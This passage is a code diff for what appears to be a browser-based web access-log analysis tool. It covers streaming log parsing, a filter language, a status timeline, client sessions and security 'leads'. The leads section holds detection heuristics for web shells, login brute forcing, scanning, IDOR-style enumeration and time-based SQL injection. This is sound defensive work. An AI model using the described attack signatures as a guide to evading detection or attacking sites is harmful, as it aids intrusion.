+  const reader = stream.pipeThrough(new TextDecoderStream()).getReader();
+  let buf = '', read = 0, last = performance.now(), dropping = false;
+  for (;;) {
+    const { done, value } = await reader.read();
+    if (done) break;
+    read += value.length;
+    if (dropping) {
+      const nl = value.indexOf('\n');
+      if (nl < 0) continue;
+      dropping = false; buf = value.slice(nl + 1);
+    } else buf += value;
+    const cut = buf.lastIndexOf('\n');
+    if (cut < 0) {
+      if (buf.length > MAX_LINE) { skipLine(buf, idx, 'long'); buf = ''; dropping = true; }
+      continue;
+    }
+    const lines = buf.slice(0, cut).split('\n');
+    buf = buf.slice(cut + 1);
+    for (let i = 0; i < lines.length; i++) ingestLine(lines[i], idx);
+    if (performance.now() - last > 80) {
+      setProgress(gz ? null : Math.min(read / (file.size || 1), 1), `Reading ${file.name}: ${fmtN(state.events.length)} requests`);
+      await tick(); last = performance.now();
+    }
+  }
+  if (buf) ingestLine(buf, idx);
+}
+async function loadFiles(list) {
+  const files = [...list]; if (!files.length) return;
+  closeDrawer(); showProgress(true);
+  for (const file of files) {
+    const idx = state.files.length;
+    state.files.push(file.name); state.fileFmts.push(Object.create(null));
+    state.fileSize.push(file.size); state.fileHash.push(''); state.fileSkipped.push(0); state.fileUnloaded.push(0);
+    setProgress(0, `Reading ${file.name}`); await tick();
+    try { await readFile(file, idx); } catch (err) { state.fileErrors.push(`${file.name}: ${err.message || err}`); }
+  }
+  setProgress(1, `Sorting ${fmtN(state.events.length)} requests`); await tick();
+  state.events.sort((a, b) => { const x = a.$t, y = b.$t; if (x === x) return y === y ? x - y : -1; return y === y ? 1 : 0; });
+  setProgress(1, 'Building views'); await tick();
+  applyRt(false);
+  $('empty').hidden = true; $('main').hidden = false; $('clearBtn').hidden = false; $('summaryBtn').hidden = false;
+  state.range = null;
+  computeSites(); renderSites();
+  applyFilters();
+  showProgress(false);
+}
+function showProgress(on) { $('progress').hidden = !on; }
+function setProgress(frac, text) {
+  $('pfill').style.width = frac == null ? '100%' : Math.round(frac * 100) + '%';
+  $('pfill').style.opacity = frac == null ? '.4' : '1';
+  $('ptext').textContent = vis(text);
+}
+
+/* ---------- response-time interpretation of extra fields ---------- */
+const RT_LABEL = nullProto({ us: 'microseconds (Apache %D)', ms: 'milliseconds', s: 'seconds (Apache %T or nginx $request_time)', none: 'not a response time' });
+const NUM_RE = /^\d+(\.\d+)?$/;
+function applyRt(rerender) {
+  // Survey every extra field: how often present, how often numeric, sample values.
+  const ex = [];
+  for (let k = 1; k <= 8; k++) ex.push({ name: 'x' + k, n: 0, num: 0, dec: 0, samples: [] });
+  for (const o of state.events) for (let k = 1; k <= 8; k++) {
+    const x = o['x' + k]; if (x === undefined) break;
+    const e = ex[k - 1]; e.n++;
+    if (e.samples.length < 4 && !e.samples.includes(x)) e.samples.push(x);
+    if (NUM_RE.test(x)) { e.num++; if (x.includes('.')) e.dec++; }
+  }
+  state.extras = ex.filter(e => e.n);
+  // Automatic choice: the extra field that is most often numeric (and numeric on at least half its lines).
+  const cand = state.extras.filter(e => e.num >= e.n / 2).sort((a, b) => b.num - a.num)[0];
+  state.rtFieldAuto = cand ? cand.name : '';
+  const field = state.rtField === 'auto' ? state.rtFieldAuto : state.rtField === 'none' ? '' : state.rtField;
+  const fe = state.extras.find(e => e.name === field);
+  state.rtAuto = !fe ? 'none' : fe.dec > fe.num / 2 ? 's' : 'us';
+  const unit = !field ? 'none' : state.rtMode === 'auto' ? state.rtAuto : state.rtMode;
+  state.rtUnit = unit; state.rtFieldUsed = unit === 'none' ? '' : field;
+  const f = { us: 1e-3, ms: 1, s: 1e3 }[unit];
+  for (const o of state.events) { const x = field ? o[field] : undefined; if (f && x !== undefined && NUM_RE.test(x)) o.$rt = Number(x) * f; else delete o.$rt; }
+  if (rerender) { computeSites(); renderSites(); applyFilters({ keepC: true }); }
+}
+const rtDesc = () => state.rtFieldUsed ? `field ${state.rtFieldUsed} read as ${RT_LABEL[state.rtUnit]}` : 'no response time field in use';
+
+/* ================= filter language ================= */
+const TOKEN_RE = /(?:[^\s"]+|"[^"]*")+/g;
+const CL_RE = /^(-?)([A-Za-z_$][\w.$-]*?)(!=|>=|<=|=|~|>|<)([\s\S]*)$/;
+const ALIAS = nullProto({
+  source: ['$srcId'], ip: ['client'], agent: ['ua'], ref: ['referer'], site: ['vhost'], class: ['$sc'], rule: ['$rules'], ext: ['$ext'],
+  refhost: ['$refhost'], param: ['$qkeys'], rt: ['$rt'], file: ['$file'], url: ['$url'], format: ['$fmt']
+});
+const urlOf = o => o.path + (o.query !== undefined ? '?' + o.query : '');
+const getField = (o, f) => f === '$url' ? urlOf(o) : o[f];
+function tokenize2(q) { return (q.match(TOKEN_RE) || []).filter(Boolean); }
+function parseToken(tok) {
+  const m = CL_RE.exec(tok);
+  if (m) {
+    const raw = m[4], quoted = raw.startsWith('"'), val = raw.replace(/"/g, '');
+    return { kind: 'field', neg: m[1] === '-', field: m[2].toLowerCase(), op: m[3], quoted, values: quoted ? [val] : val.split(',').map(s => s.trim()) };
+  }
+  const neg = tok.length > 1 && tok[0] === '-';
+  const text = (neg ? tok.slice(1) : tok).replace(/"/g, '');
+  return text ? { kind: 'text', neg, text } : null;
+}
+function ip4(s) {
+  const p = String(s).split('.'); if (p.length !== 4) return null;
+  let n = 0;
+  for (const x of p) { if (!/^\d{1,3}$/.test(x)) return null; const v = +x; if (v > 255) return null; n = n * 256 + v; }
+  return n;
+}
+function cidrMatch(ip, cidr) {
+  const [base, bits] = cidr.split('/'), b = ip4(base), i = ip4(ip), m = Number(bits);
+  if (b == null || i == null || !(m >= 0 && m <= 32)) return false;
+  const div = 2 ** (32 - m);
+  return Math.floor(i / div) === Math.floor(b / div);
+}
+function compile(cl) {
+  if (cl.kind === 'text') {
+    const re = new RegExp(escRe(cl.text), 'i');
+    return cl.neg ? o => !re.test(o.$raw) : o => re.test(o.$raw);
+  }
+  const fields = ALIAS[cl.field] || [cl.field];
+  const each = (x, fn) => Array.isArray(x) ? x.some(fn) : fn(x);
+  let test;
+  if (cl.op === '=' || cl.op === '!=') {
+    const testers = cl.values.map(v => {
+      const vl = v.toLowerCase();
+      if (vl === '') return x => x === undefined || x === '';
+      if (!cl.quoted && /^\d{1,3}(\.\d{1,3}){3}\/\d{1,2}$/.test(vl)) return x => x !== undefined && each(x, y => cidrMatch(y, vl));
+      if (!cl.quoted && vl.includes('*')) { const re = new RegExp('^' + vl.split('*').map(escRe).join('.*') + '$', 'i'); return x => x !== undefined && each(x, y => re.test(String(y))); }
+      return x => x !== undefined && each(x, y => String(y).toLowerCase() === vl);
+    });
+    test = o => { for (const f of fields) { const x = getField(o, f); for (const t of testers) if (t(x)) return true; } return false; };
+  } else if (cl.op === '~') {
+    const vals = cl.values.map(v => v.toLowerCase()).filter(Boolean);
+    if (!vals.length) return `"${cl.field}~" needs some text after the ~`;
+    test = o => {
+      for (const f of fields) {
+        const x = getField(o, f); if (x === undefined) continue;
+        if (each(x, y => { const yl = String(y).toLowerCase(); return vals.some(v => yl.includes(v)); })) return true;
+      }
+      return false;
+    };
+  } else {
+    const n = Number(cl.values[0]);
+    if (cl.values[0] === '' || isNaN(n)) return `"${cl.field}${cl.op}${cl.values[0]}" needs a number`;
+    const cmp = { '>': (a, b) => a > b, '<': (a, b) => a < b, '>=': (a, b) => a >= b, '<=': (a, b) => a <= b }[cl.op];
+    test = o => { for (const f of fields) { const r = getField(o, f); if (r === undefined || r === '') continue; const x = Number(r); if (!isNaN(x) && cmp(x, n)) return true; } return false; };
+  }
+  const neg = cl.neg !== (cl.op === '!=');
+  return neg ? o => !test(o) : test;
+}
+function applyFilters(opts = {}) {
+  if (!opts.keepC) {
+    state.filterError = '';
+    const preds = [];
+    for (const tok of state.tokens) {
+      const cl = parseToken(tok); if (!cl) continue;
+      let p;
+      try { p = compile(cl); } catch (err) { p = `"${tok}" could not be applied (${err.message || err})`; }
+      if (typeof p === 'string') { state.filterError = p; continue; }
+      preds.push(p);
+    }
+    const ev = state.events;
+    try {
+      if (preds.length) {
+        const out = [];
+        outer: for (let i = 0; i < ev.length; i++) { const o = ev[i]; for (let j = 0; j < preds.length; j++) if (!preds[j](o)) continue outer; out.push(o); }
+        state.C = out;
+      } else state.C = ev;
+    } catch (err) { state.C = []; state.filterError = `Filter failed and nothing is shown: ${err.message || err}`; }
+    state.buckets = buildBuckets(state.C);
+  }
+  const r = state.range;
+  state.F = r ? state.C.filter(o => o.$t >= r[0] && o.$t < r[1]) : state.C;
+  state.page = 0;
+  renderAll();
+}
+const FIELD_ALIAS_OUT = nullProto({ $sc: 'class', $rules: 'rule', $ext: 'ext', $refhost: 'refhost', $qkeys: 'param', $file: 'file', $rt: 'rt' });
+function makeToken(field, value, exclude) {
+  const f = FIELD_ALIAS_OUT[field] || field;
+  const v = String(value).replace(/"/g, '');
+  const q = /[\s,*]/.test(v) || v === '' ? `"${v}"` : v;
+  return `${f}${exclude ? '!=' : '='}${q}`;
+}
+function addTokens(toks) {
+  for (const t of toks) {
+    const opposite = t.includes('!=') ? t.replace('!=', '=') : t.replace('=', '!=');
+    state.tokens = state.tokens.filter(x => x !== opposite);
+    if (!state.tokens.includes(t)) state.tokens.push(t);
+  }
+  $('q').value = state.tokens.join(' ');
+  applyFilters();
+}
+
+/* ================= timeline ================= */
+const STEPS = [1e3, 5e3, 1e4, 3e4, 6e4, 3e5, 6e5, 9e5, 18e5, 36e5, 108e5, 216e5, 432e5, 864e5, 6048e5];
+const TL = { padL: 50, padR: 10, padT: 10, padB: 24, H: 160 };
+const SC_ORDER = ['5xx', '4xx', '3xx', '2xx', 'other'];          // stacking order, errors on the baseline
+const SC_VAR = nullProto({ '5xx': '--s5', '4xx': '--s4', '3xx': '--s3', '2xx': '--s2', other: '--so' });
+function buildBuckets(C) {
+  let lo = Infinity, hi = -Infinity;
+  for (let i = 0; i < C.length; i++) { const t = C[i].$t; if (t === t) { if (t < lo) lo = t; if (t > hi) hi = t; } }
+  if (lo === Infinity) return null;
+  let step = STEPS[STEPS.length - 1];
+  for (const s of STEPS) if ((hi - lo) / s <= 180) { step = s; break; }
+  const off = step >= 36e5 && state.tz === 'local' ? -new Date(lo).getTimezoneOffset() * 6e4 : 0;
+  const start = Math.floor((lo + off) / step) * step - off;
+  const n = Math.max(1, Math.floor((hi - start) / step) + 1);
+  const c = nullProto({}); for (const k of SC_ORDER) c[k] = new Uint32Array(n);
+  for (let i = 0; i < C.length; i++) {
+    const o = C[i], t = o.$t; if (!(t >= start)) continue;
+    c[o.$sc][Math.min(n - 1, Math.floor((t - start) / step))]++;
+  }
+  return { start, step, n, c };
+}
+function tlGeom() { const W = $('tl').clientWidth, pw = Math.max(10, W - TL.padL - TL.padR), B = state.buckets; return { W, pw, bw: B ? pw / B.n : 0 }; }
+function cssVar(n) { return getComputedStyle(document.documentElement).getPropertyValue(n).trim(); }
+function tickLabel(t, step, span) {
+  const [, M, D, h, m, s] = parts(t);
+  if (step >= 864e5) return `${pad(M)}-${pad(D)}`;
+  const hm = `${pad(h)}:${pad(m)}`;
+  if (span > 864e5) return `${pad(M)}-${pad(D)} ${hm}`;
+  return step < 6e4 ? `${hm}:${pad(s)}` : hm;
+}
+function drawTimeline() {
+  const cv = $('tl'); if ($('main').hidden) return;
+  const dpr = window.devicePixelRatio || 1, { W, pw, bw } = tlGeom(), H = TL.H;
+  cv.width = Math.round(W * dpr); cv.height = Math.round(H * dpr);
+  const g = cv.getContext('2d'); g.setTransform(dpr, 0, 0, dpr, 0, 0); g.clearRect(0, 0, W, H);
+  const ph = H - TL.padT - TL.padB, B = state.buckets;
+  const col = nullProto({}); for (const k of SC_ORDER) col[k] = cssVar(SC_VAR[k]);
+  const rule = cssVar('--rule'), muted = cssVar('--muted'), focus = cssVar('--focus'), shade = cssVar('--shade');
+  g.font = '11px ' + cssVar('--sans'); g.fillStyle = muted;
+  if (!B) { g.fillText('No timestamped requests in this selection.', TL.padL, H / 2); $('rangeReset').hidden = !state.range; return; }
+  let max = 1;
+  for (let i = 0; i < B.n; i++) { let s = 0; for (const k of SC_ORDER) s += B.c[k][i]; if (s > max) max = s; }
+  g.strokeStyle = rule; g.lineWidth = 1; g.textAlign = 'right'; g.textBaseline = 'middle';
+  for (const f of [0, 0.5, 1]) {
+    const y = Math.round(TL.padT + ph - f * ph) + 0.5;
+    g.beginPath(); g.moveTo(TL.padL, y); g.lineTo(TL.padL + pw, y); g.stroke();
+    g.fillText(fmtN(Math.round(max * f)), TL.padL - 6, y);
+  }
+  const gap = bw > 4 ? 1 : 0;
+  for (let i = 0; i < B.n; i++) {
+    const x = TL.padL + i * bw, w = Math.max(1, bw - gap); let y = TL.padT + ph;
+    for (const k of SC_ORDER) { const v = B.c[k][i]; if (!v) continue; const h = Math.max(1, v / max * ph); g.fillStyle = col[k]; g.fillRect(x, y - h, w, h); y -= h; }
+  }
+  g.fillStyle = muted; g.textAlign = 'center'; g.textBaseline = 'top';
+  const span = B.n * B.step, every = Math.max(1, Math.ceil(B.n / Math.max(2, Math.floor(pw / 115))));
+  for (let i = 0; i < B.n; i += every) g.fillText(tickLabel(B.start + i * B.step, B.step, span), clamp(TL.padL + i * bw, TL.padL + 30, TL.padL + pw - 30), TL.padT + ph + 6);
+  let sel = null;
+  if (state.drag) sel = [Math.min(state.drag.x0, state.drag.x1), Math.max(state.drag.x0, state.drag.x1)];
+  else if (state.range) sel = [TL.padL + (state.range[0] - B.start) / B.step * bw, TL.padL + (state.range[1] - B.start) / B.step * bw];
+  if (sel) {
+    const x0 = clamp(sel[0], TL.padL, TL.padL + pw), x1 = clamp(sel[1], TL.padL, TL.padL + pw);
+    g.fillStyle = shade; g.fillRect(TL.padL, TL.padT, x0 - TL.padL, ph); g.fillRect(x1, TL.padT, TL.padL + pw - x1, ph);
+    g.strokeStyle = focus; g.lineWidth = 1.5; g.strokeRect(x0, TL.padT + 0.5, Math.max(1, x1 - x0), ph - 1);
+  }
+  $('rangeReset').hidden = !state.range;
+}
+function bucketAt(x) { const B = state.buckets, { bw } = tlGeom(); return clamp(Math.floor((x - TL.padL) / bw), 0, B.n - 1); }
+function setupTimeline() {
+  const cv = $('tl'), tip = $('tlTip'), xOf = e => e.clientX - cv.getBoundingClientRect().left;
+  cv.addEventListener('pointerdown', e => {
+    if (!state.buckets) return;
+    const { pw } = tlGeom(), x = clamp(xOf(e), TL.padL, TL.padL + pw - 0.01);
+    state.drag = { x0: x, x1: x }; tip.hidden = true; cv.setPointerCapture(e.pointerId);
+  });
+  cv.addEventListener('pointermove', e => {
+    const B = state.buckets; if (!B) return;
+    const { pw } = tlGeom(), x = xOf(e);
+    if (state.drag) { state.drag.x1 = clamp(x, TL.padL, TL.padL + pw - 0.01); drawTimeline(); return; }
+    if (x < TL.padL || x > TL.padL + pw) { tip.hidden = true; return; }
+    const i = bucketAt(x), t0 = B.start + i * B.step;
+    tip.innerHTML = `<strong>${esc(fmtTime(t0))}</strong> to ${esc(fmtTime(t0 + B.step))}<br>` +
+      SC_ORDER.map(k => `${esc(k)}: ${fmtN(B.c[k][i])}`).join('<br>');
+    tip.hidden = false;
+    tip.style.left = clamp(x + 14, 0, cv.clientWidth - tip.offsetWidth) + 'px'; tip.style.top = '8px';
+  });
+  const finish = () => {
+    const d = state.drag; if (!d) return; state.drag = null;
+    const B = state.buckets;
+    let i0 = bucketAt(Math.min(d.x0, d.x1)), i1 = bucketAt(Math.max(d.x0, d.x1));
+    if (Math.abs(d.x1 - d.x0) < 4) i1 = i0;
+    state.range = [B.start + i0 * B.step, B.start + (i1 + 1) * B.step];
+    applyFilters({ keepC: true });
+  };
+  cv.addEventListener('pointerup', finish);
+  cv.addEventListener('pointercancel', () => { state.drag = null; drawTimeline(); });
+  cv.addEventListener('pointerleave', () => { if (!state.drag) tip.hidden = true; });
+}
+
+/* ================= leads ================= */
+const SCRIPT_EXT = new Set(['php', 'php5', 'php7', 'phtml', 'jsp', 'jspx', 'asp', 'aspx', 'ashx', 'asmx', 'cfm', 'cgi', 'pl', 'py', 'sh']);
+const AUTH_RE = /(login|logon|signin|sign-in|sign_in|auth|oauth|token|session|wp-login\.php|xmlrpc\.php|j_security_check|password|sso)/i;
+const UPLOAD_DIR_RE = /\/(uploads?|files|images?|img|media|tmp|temp|static|assets|content|attachments?)\//i;
+const scMix = st => Object.entries(st).sort((a, b) => b[1] - a[1]).slice(0, 4).map(([k, n]) => `${k}×${fmtN(n)}`).join(' ');
+function computeLeads(F) {
+  const rules = new Map(), okHits = new Map(), clients = new Map(), shells = new Map(), auth = new Map(), enumv = new Map(), p5 = new Map();
+  const bigResp = [], slowReq = []; let enumKeys = 0;
+  for (let i = 0; i < F.length; i++) {
+    const o = F[i], c = o.client, sc = o.$sc;
+    let cs = clients.get(c);
+    if (!cs) clients.set(c, cs = { n: 0, s4: 0, s5: 0, paths: new Set(), uas: new Set(), rules: 0, bytes: 0, curMin: -1, curCnt: 0, peak: 0, peakAt: NaN, emptyUa: 0, tool: '' });
+    cs.n++; if (sc === '4xx') cs.s4++; else if (sc === '5xx') cs.s5++;
+    if (cs.paths.size < 1000) cs.paths.add(o.path);
+    if (o.ua !== undefined && cs.uas.size < 100) cs.uas.add(o.ua);
+    if (o.ua === undefined || o.ua === '-' || o.ua === '') cs.emptyUa++;
+    const b = Number(o.bytes) || 0; cs.bytes += b;
+    if (o.$t === o.$t) {
+      const mi = Math.floor(o.$t / 6e4);
+      if (mi === cs.curMin) cs.curCnt++; else { cs.curMin = mi; cs.curCnt = 1; }
+      if (cs.curCnt > cs.peak) { cs.peak = cs.curCnt; cs.peakAt = mi * 6e4; }
+    }
+    if (o.$rules) {
+      cs.rules++;
+      for (const r of o.$rules) {
+        let rs = rules.get(r); if (!rs) rules.set(r, rs = { n: 0, clients: new Set(), sc: Object.create(null) });
+        rs.n++; if (rs.clients.size < 5000) rs.clients.add(c); rs.sc[sc] = (rs.sc[sc] || 0) + 1;
+        if (r === 'tool' && !cs.tool) { const m = TOOL_UA.exec(o.ua || ''); if (m) cs.tool = m[1]; }
+        if (STRONG.has(r) && sc === '2xx') {
+          const k = r + '\u0000' + c + '\u0000' + o.path;
+          let h = okHits.get(k); if (!h) okHits.set(k, h = { n: 0, r, c, path: o.path, method: o.method, bytes: 0 });
+          h.n++; h.bytes += b;
+        }
+      }
+    }
+    if (b > 0) pushTop(bigResp, b, o, 8);
+    if (o.$rt !== undefined && o.method !== '(none)' && o.status !== '408') pushTop(slowReq, o.$rt, o, 8);   // 408 = idle connection timing out, not a slow page
+    if (sc === '5xx') p5.set(o.path, (p5.get(o.path) || 0) + 1);
+    if (o.$ext && SCRIPT_EXT.has(o.$ext)) {
+      const pk = o.path.toLowerCase();
+      let s = shells.get(pk); if (!s) shells.set(pk, s = { n: 0, ok: 0, posts: 0, cmd: false, clients: new Set(), path: o.path });
+      s.n++; if (sc === '2xx') s.ok++; if (o.method === 'POST') s.posts++; if (s.clients.size < 10) s.clients.add(c);
+      if (o.$rules && (o.$rules.includes('webshell') || o.$rules.includes('cmdi'))) s.cmd = true;
+    }
+    if (o.path && AUTH_RE.test(o.path) && (o.method === 'POST' || o.status === '401' || o.status === '403')) {
+      const k = c + '\u0000' + o.path;
+      let a = auth.get(k); if (!a) auth.set(k, a = { n: 0, c, path: o.path, fail: 0, okAfter: 0, posts: 0, st: Object.create(null) });
+      a.n++; if (o.method === 'POST') a.posts++; a.st[o.status] = (a.st[o.status] || 0) + 1;
+      if (o.status === '401' || o.status === '403') a.fail++; else if ((sc === '2xx' || sc === '3xx') && a.fail >= 5) a.okAfter++;
+    }
+    if (o.query && enumKeys < 50000) {
+      for (const part of o.query.split('&')) {
+        const e = part.indexOf('='); if (e <= 0) continue;
+        const k = c + '\u0000' + o.path + '\u0000' + part.slice(0, e);
+        let s = enumv.get(k); if (!s) { enumv.set(k, s = new Set()); enumKeys++; }
+        if (s.size < 5000) s.add(part.slice(e + 1));
+      }
+    }
+  }
+
+  const L = [], top = (arr, k, by) => arr.sort((a, b) => by(b) - by(a)).slice(0, k);
+
+  const ok = [...okHits.values()];
+  if (ok.length) L.push({ level: 'first', refs: [], title: 'Attack patterns answered with success (2xx)',
+    why: 'A 2xx means the server returned content, not that the attack worked: many apps answer 200 to anything. Compare the response size with normal responses for that path, and read what the client did next in its conversation.',
+    rows: top(ok, 8, h => h.n).map(h => ({ k: `${h.c} ${h.method} ${h.path}`, d: `${RULE_NAME[h.r]}; ${fmtN(h.n)} request${h.n > 1 ? 's' : ''}, ${fmtBytes(h.bytes)} returned`, t: [makeToken('ip', h.c), makeToken('rule', h.r), 'class=2xx'] })) });
+
+  const shellRows = [...shells.values()].filter(s => s.ok > 0 && s.clients.size <= 2 && s.n <= 200 && (s.cmd || s.posts > 0 || UPLOAD_DIR_RE.test(s.path)));
+  if (shellRows.length) L.push({ level: 'first', refs: ['webshell'],
+    how: 'Listed when all of these hold for one script path (.php, .jsp, .asp, .aspx, .ashx, .cfm, .cgi, .pl, .py, .sh): at least one 2xx response; used by no more than two clients; no more than 200 requests in the selection; and at least one of: a command-style parameter or known web shell name, a POST, or a location in an upload-style folder (uploads, images, tmp, files, media, static, assets). It cannot see whether the file is legitimate, so confirm on the server before calling it a web shell.',
+    title: 'Possible web shell use',
+    why: 'Script files answered successfully for only one or two clients, in upload-style folders, by POST, or with command-style parameters. Normal pages are used by many clients; a web shell is usually used only by whoever planted it.',
+    rows: top(shellRows, 8, s => (s.cmd ? 1e6 : 0) + s.n).map(s => ({ k: s.path, d: `${fmtN(s.n)} requests from ${[...s.clients].join(', ')}; ${fmtN(s.ok)} successful${s.posts ? `, ${fmtN(s.posts)} POST` : ''}${s.cmd ? ', command-style parameters' : ''}`, t: [makeToken('path', s.path)] })) });
+
+  const au = [...auth.values()].filter(a => a.n >= 10);
+  if (au.length) L.push({ level: au.some(a => a.okAfter || a.n >= 50) ? 'first' : 'review', refs: ['stuffing'], title: 'Repeated login attempts',
+    why: 'Many authentication requests from one client to one endpoint. A switch to 2xx/3xx after many 401/403 responses is what a successful guess looks like. Forms that answer 200 to a failed login will not show it, so read the status mix.',
+    rows: top(au, 8, a => (a.okAfter ? 1e6 : 0) + a.n).map(a => ({ k: `${a.c} → ${a.path}`, d: `${fmtN(a.n)} attempts (${fmtN(a.posts)} POST); ${scMix(a.st)}${a.okAfter ? '; success status after repeated failures' : ''}`, t: [makeToken('ip', a.c), makeToken('path', a.path)] })) });
+
+  const rl = [...rules.entries()];
+  if (rl.length) L.push({ level: rl.some(([r]) => STRONG.has(r) || r === 'tool') ? 'first' : 'review', title: 'Request patterns by type',
+    why: 'Pattern matches on the decoded URL, method and user agent. They show intent, not success. Look at the status mix and which clients are behind each one.',
+    rows: top(rl, 12, e => e[1].n).map(([r, s]) => ({ k: RULE_NAME[r], d: `${fmtN(s.n)} requests from ${fmtN(s.clients.size)} clients; ${scMix(s.sc)}`, t: [makeToken('rule', r)] })) });
+
+  const scans = [...clients.entries()].filter(([, s]) => s.n >= 30 && s.s4 / s.n >= 0.5 && s.paths.size >= 20);
+  if (scans.length) L.push({ level: scans.some(([, s]) => s.rules || s.tool) ? 'first' : 'review', refs: ['forced', 'scanning'], title: 'Scanning and forced browsing',
+    why: 'Clients whose requests are mostly 4xx across many different paths: content discovery or vulnerability scanning. Most is internet noise; check whether any of these clients also got 2xx on something it should not have.',
+    rows: top(scans, 8, e => e[1].s4).map(([c, s]) => ({ k: c, d: `${fmtN(s.n)} requests, ${Math.round(s.s4 / s.n * 100)}% 4xx, ${s.paths.size >= 1000 ? '1,000+' : fmtN(s.paths.size)} paths${s.tool ? `, tool: ${s.tool}` : ''}`, t: [makeToken('ip', c)] })) });
+
+  const en = [...enumv.entries()].filter(([, s]) => s.size >= 50);
+  if (en.length) L.push({ level: 'review', refs: ['idor'], title: 'Parameter enumeration',
+    why: 'One client walking through many values of the same parameter on one path: scraping, data harvesting, or probing for objects it should not see (IDOR). Legitimate integrations usually poll a small, fixed set of values.',
+    rows: top(en, 8, e => e[1].size).map(([k, s]) => { const [c, p, prm] = k.split('\u0000'); return { k: `${c} → ${p}?${prm}=`, d: `${s.size >= 5000 ? '5,000+' : fmtN(s.size)} distinct values`, t: [makeToken('ip', c), makeToken('path', p), makeToken('param', prm.toLowerCase())] }; }) });
+
+  const rate = [...clients.entries()].filter(([, s]) => s.peak >= 120);
+  if (rate.length) L.push({ level: 'review', title: 'Request-rate peaks',
+    why: 'Clients that reached 120 or more requests in a single minute. Integrations and crawlers can be this busy; an unknown client this busy is scraping, brute forcing or trying to exhaust the application.',
+    rows: top(rate, 8, e => e[1].peak).map(([c, s]) => ({ k: c, d: `peak ${fmtN(s.peak)} requests/minute at ${fmtTime(s.peakAt)}; ${fmtN(s.n)} in total`, t: [makeToken('ip', c)] })) });
+
+  const err5 = [...clients.entries()].filter(([, s]) => s.s5 >= 5);
+  if (p5.size) L.push({ level: err5.some(([c]) => (clients.get(c).rules || 0) > 0) ? 'first' : 'review', title: 'Server errors (5xx)',
+    why: 'Errors clustered on one path point at a fault or a target. Errors clustered on one client often mean fuzzing or exploit attempts breaking the application, especially alongside pattern matches.',
+    rows: top([...p5.entries()], 5, e => e[1]).map(([p, n]) => ({ k: `path ${p || '(none)'}`, d: `${fmtN(n)} server errors`, t: [makeToken('path', p), 'class=5xx'] }))
+      .concat(top(err5, 4, e => e[1].s5).map(([c, s]) => ({ k: `client ${c}`, d: `${fmtN(s.s5)} server errors${s.rules ? `, ${fmtN(s.rules)} pattern matches` : ''}`, t: [makeToken('ip', c), 'class=5xx'] }))) });
+
+  if (bigResp.length) L.push({ level: 'review', title: 'Largest responses',
+    why: 'The biggest single responses. Exports, backups and database dumps leaving the site show up here; so do ordinary downloads, so judge by path and client.',
+    rows: bigResp.map(([b, o]) => ({ k: `${o.client} ${o.method} ${o.path}`, d: `${fmtBytes(b)}, status ${o.status}, ${fmtTime(o.$t)}`, t: [makeToken('ip', o.client), makeToken('path', o.path)] })) });
+
+  if (slowReq.length) L.push({ level: slowReq.some(([, o]) => o.$rules && o.$rules.includes('sqli')) ? 'first' : 'review', refs: ['blindsqli'], title: 'Slowest requests',
+    why: `Longest response times (${rtDesc()}). Slow responses to unusual parameters are the classic sign of time-based SQL injection or an expensive query being abused.`,
+    rows: slowReq.map(([v, o]) => ({ k: `${o.client} ${o.method} ${o.path}${o.query ? '?' + o.query : ''}`, d: `${fmtMs(v)}, status ${o.status}${o.$rules ? `; ${o.$rules.map(r => RULE_NAME[r]).join(', ')}` : ''}`, t: [makeToken('ip', o.client), makeToken('path', o.path)] })) });
+
+  const many = [...clients.entries()].filter(([, s]) => s.uas.size >= 10), empty = [...clients.entries()].filter(([, s]) => s.emptyUa >= 20);
+  if (many.length || empty.length) L.push({ level: 'review', title: 'User agent anomalies',
+    why: 'One client presenting many user agents is usually rotating them to look like many visitors. Clients that send no user agent at all are almost always scripts.',
+    rows: top(many, 5, e => e[1].uas.size).map(([c, s]) => ({ k: c, d: `${s.uas.size >= 100 ? '100+' : fmtN(s.uas.size)} different user agents`, t: [makeToken('ip', c)] }))
+      .concat(top(empty, 4, e => e[1].emptyUa).map(([c, s]) => ({ k: c, d: `${fmtN(s.emptyUa)} requests with no user agent`, t: [makeToken('ip', c)] }))) });
+
+  L.sort((a, b) => (a.level === 'first' ? 0 : 1) - (b.level === 'first' ? 0 : 1));
+  return L;
+}
+
+/* ================= conversations (client sessions) ================= */
+function buildSessions(F, gapMin) {
+  const gap = gapMin * 6e4, open = new Map(), out = [];
+  for (let i = 0; i < F.length; i++) {
+    const o = F[i], t = o.$t; if (t !== t) continue;
+    const key = o.client + '\u0000' + (o.ua || '') + '\u0000' + (o.vhost || '');
+    let s = open.get(key);
+    if (!s || t - s.last > gap) {
+      s = { sid: o.$srcId, client: o.client, ua: o.ua || '', vhost: o.vhost || '', file: o.$file, first: t, last: t, n: 0, ev: [], paths: new Set(),
+        sc: nullProto({ '2xx': 0, '3xx': 0, '4xx': 0, '5xx': 0, other: 0 }), bytes: 0, rules: 0, users: new Set(), methods: new Set() };
+      open.set(key, s); out.push(s);
+    }
+    s.last = t; s.n++;
+    if (s.ev.length < 20000) s.ev.push(o);
+    if (s.paths.size < 5000) s.paths.add(o.path);
+    s.sc[o.$sc]++; s.bytes += Number(o.bytes) || 0; if (isHit(o)) s.rules++;
+    if (o.user && o.user !== '-') s.users.add(o.user);
+    s.methods.add(o.method);
+  }
+  return out;
+}
+const ipKey = x => { const n = ip4(x); return n == null ? 2 ** 33 : n; };
+const CV_COLS = [
+  ['first', 'Start', s => fmtTime(s.first), s => s.first, 'm'],
+  ['dur', 'Duration', s => fmtDur(s.last - s.first), s => s.last - s.first, 'num'],
+  ['client', 'Client', s => s.client, s => ipKey(s.client), 'm'],
+  ['ua', 'User agent', s => s.ua, s => s.ua],
+  ['n', 'Requests', s => fmtN(s.n), s => s.n, 'num'],
+  ['np', 'Paths', s => fmtN(s.paths.size), s => s.paths.size, 'num'],
+  ['s2', '2xx', s => s.sc['2xx'] ? fmtN(s.sc['2xx']) : '', s => s.sc['2xx'], 'num'],
+  ['s3', '3xx', s => s.sc['3xx'] ? fmtN(s.sc['3xx']) : '', s => s.sc['3xx'], 'num'],
+  ['s4', '4xx', s => s.sc['4xx'] ? fmtN(s.sc['4xx']) : '', s => s.sc['4xx'], 'num'],
+  ['s5', '5xx', s => s.sc['5xx'] ? fmtN(s.sc['5xx']) : '', s => s.sc['5xx'], 'num'],
+  ['bytes', 'Bytes', s => fmtBytes(s.bytes), s => s.bytes, 'num'],
+  ['rules', 'Pattern hits', s => s.rules ? fmtN(s.rules) : '', s => s.rules, 'num'],
